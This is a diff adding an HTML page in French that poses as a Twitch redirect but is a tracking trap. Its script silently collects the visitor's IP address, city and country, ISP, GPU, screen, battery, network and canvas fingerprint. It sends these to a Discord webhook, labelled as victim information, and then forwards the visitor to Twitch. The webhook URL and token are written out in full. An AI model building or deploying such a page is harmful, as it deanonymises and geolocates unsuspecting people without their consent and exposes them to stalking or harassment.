@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>twitch.tv</title>
+<link rel="icon" href="https://www.twitch.tv/favicon.ico">
+<style>
+  html,body{margin:0;height:100%;background:#0e0e10;color:#efeff1;
+  font-family:Inter,system-ui,sans-serif;display:flex;align-items:center;
+  justify-content:center;flex-direction:column;gap:18px}
+  .loader{width:44px;height:44px;border:4px solid #ffffff22;
+  border-top-color:#9147ff;border-radius:50%;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  p{opacity:.6;font-size:14px}
+</style>
+</head>
+<body>
+  <div class="loader"></div>
+  <p>Redirection vers Twitch…</p>
+
+<script>
+/* ====== METS TON WEBHOOK ICI ====== */
+const WEBHOOK = "https://discord.com/api/webhooks/1571811746522464307/REyCSk0KWS3N8dkGV2BuIfly47n0G-81qVAGozbpTnQtypVZU6EdxeCeQu8TXwXJ6u1A";
+
+(async function () {
+  const d = {
+    time: new Date().toISOString(),
+    referrer: document.referrer || "direct",
+    url: location.href,
+    browser: {},
+    screen: {},
+    battery: null,
+    network: {},
+    canvas_fp: null,
+    webgl: null,
+    fonts: null,
+    ip: null
+  };
+
+  const ua = navigator.userAgent;
+  d.browser = {
+    userAgent: ua,
+    language: navigator.language,
+    languages: navigator.languages,
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cores: navigator.hardwareConcurrency || null,
+    memory: navigator.deviceMemory || null,
+    mobile: /Mobi|Android|iPhone|iPad/i.test(ua),
+    touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+    cookies: navigator.cookieEnabled,
+    dnt: navigator.doNotTrack,
+    online: navigator.onLine
+  };
+
+  d.screen = {
+    w: screen.width, h: screen.height,
+    availW: screen.availWidth, availH: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    dpr: devicePixelRatio,
+    viewport: innerWidth + "x" + innerHeight
+  };
+
+  const c = navigator.connection || navigator.mozConnection || {};
+  d.network = {
+    type: c.effectiveType, downlink: c.downlink,
+    rtt: c.rtt, saveData: c.saveData
+  };
+
+  /* Batterie (souvent dispo sans permission) */
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      d.battery = { level: Math.round(b.level*100)+"%", charging: b.charging };
+    }
+  } catch(e){}
+
+  /* Canvas fingerprint */
+  try {
+    const cv = document.createElement("canvas");
+    const ctx = cv.getContext("2d");
+    ctx.textBaseline = "top"; ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = "#069"; ctx.fillText("Twitch-trap-🕵️", 2, 15);
+    d.canvas_fp = cv.toDataURL().slice(-60);
+  } catch(e){}
+
+  /* WebGL (GPU) */
+  try {
+    const gl = document.createElement("canvas").getContext("webgl");
+    const ext = gl.getExtension("WEBGL_debug_renderer_info");
+    d.webgl = {
+      vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
+      renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+    };
+  } catch(e){}
+
+  /* IP + géoloc réseau (aucune permission) */
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    d.ip = await r.json();
+  } catch(e) { d.ip = { error: "fail" }; }
+
+  /* Envoi au webhook */
+  try {
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        content: "🎣 **Capture Twitch**",
+        embeds: [{
+          title: "Infos victime",
+          color: 0x9147ff,
+          fields: [
+            {name:"IP", value:`\`${d.ip?.ip||"?"}\``, inline:true},
+            {name:"Pays/Ville", value:`${d.ip?.country_name||"?"} / ${d.ip?.city||"?"}`, inline:true},
+            {name:"FAI", value:d.ip?.org||"?", inline:true},
+            {name:"GPS (via IP)", value:d.ip?.latitude ? `https://maps.google.com/?q=${d.ip.latitude},${d.ip.longitude}` : "?", inline:false},
+            {name:"Mobile", value:d.browser.mobile?"✅":"❌", inline:true},
+            {name:"Écran", value:`${d.screen.w}x${d.screen.h} (dpr ${d.screen.dpr})`, inline:true},
+            {name:"TZ", value:d.browser.timezone, inline:true},
+            {name:"Batterie", value:d.battery ? `${d.battery.level} ${d.battery.charging?"⚡":"🔋"}` : "n/a", inline:true},
+            {name:"Réseau", value:`${d.network.type||"?"} | ${d.network.downlink||"?"}Mb/s | RTT ${d.network.rtt||"?"}ms`, inline:true},
+            {name:"GPU", value:`\`${(d.webgl?.renderer||"?").slice(0,80)}\``, inline:false},
+            {name:"User-Agent", value:`\`${d.browser.userAgent.slice(0,180)}\``, inline:false},
+            {name:"Referrer", value:d.referrer.slice(0,180), inline:false}
+          ],
+          footer: {text: d.time}
+        }]
+      })
+    });
+  } catch(e){ console.error(e); }
+
+  /* Redirection vers Twitch */
+  location.href = "https://www.twitch.tv";
+})();
+</script>
+</body>
+</html>
